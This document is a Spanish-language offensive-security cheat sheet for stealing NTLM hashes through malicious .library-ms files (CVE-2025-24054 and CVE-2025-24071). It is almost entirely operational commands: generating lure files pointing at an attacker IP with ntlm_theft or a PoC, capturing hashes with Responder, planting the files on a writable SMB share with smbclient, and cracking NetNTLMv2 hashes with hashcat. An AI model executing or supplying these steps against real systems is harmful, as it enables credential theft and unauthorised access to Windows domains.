# Library-ms 

Tags: #Windows #Relay #AD #SMB #Responder 


Windows **automáticamente intenta NTLM authentication** cuando ve un archivo `.library-ms` con referencias a recursos remotos.
**Resultado:** El usuario envía su hash SIN SABER.

## Requisitos

- Credenciales válidas para acceder al SMB share.
- Acceso al recurso SMB.
- Signing = False 
- **Permiso de escritura (`WRITE`) sobre el SMB share/directorio objetivo.**
- Servers:
	Windows 11 (Pre-patch 2025)
	Windows Server 2022 (Pre-patch)
	Windows Server 2025 (Pre-patch)

## CVE-2025-24054

* [NTLM_THEFT.py](https://github.com/Greenwolf/ntlm_theft)
* [CVE-2025-24054](https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/)

- Genera 21 archivos en una carpeta

```bash 
# Instalación 
❯ git clone https://github.com/Greenwolf/ntlm_theft.git && cd ntlm_theft && python3 -m venv ~/myenv && source ~/myenv/bin/activate && pip3 install xlsxwriter
```

```bash 
Paso 1:
# Ejecución del script para generar los archivos a subir 
❯ python3 ntlm_theft.py --generate modern --server IP_Kali --filename "Intranet"
```

```bash 
Paso 2:
❯ responder -I tun0
```

```bash 
Paso 3:
❯ cd Intranet
❯ smbclient -U 'domain.local/user%pass' //<IP>/"Human Resources" -c "prompt; mput *"
# Subir todos los archivos creados del directorio actual "Intranet" en Kali al directorio del Server llamado "Human Resources"
```

```bash 
Paso 4:
# Crackear el hast obtenido del 'Responder' 
❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force 
❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force -r /usr/share/hashcat/rules/best66.rule
```

## CVE-2025-24054 y CVE-2025-24071

* [PoC](https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC)

- Genera solo el archivo ``xd.library-ms``

```bash 
Paso 1:
# Generación del archivo 'xd.library-ms'
❯ python exploit.py   

Ingresar:
	- IP Kali
```

```bash 
Paso 2:
❯ responder -I tun0
```

```bash 
Paso 3:
❯ smbclient -U 'domain.local/user%pass' //<IP>/"Human Resources" -c "put xd.library-ms"
# Subir el archivo 'xd.library-ms' al directorio del Server llamado "Human Resources"
```

```bash 
Paso 4:
# Crackear el hast obtenido del 'Responder' 
❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force 
❯ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --force -r /usr/share/hashcat/rules/best66.rule
```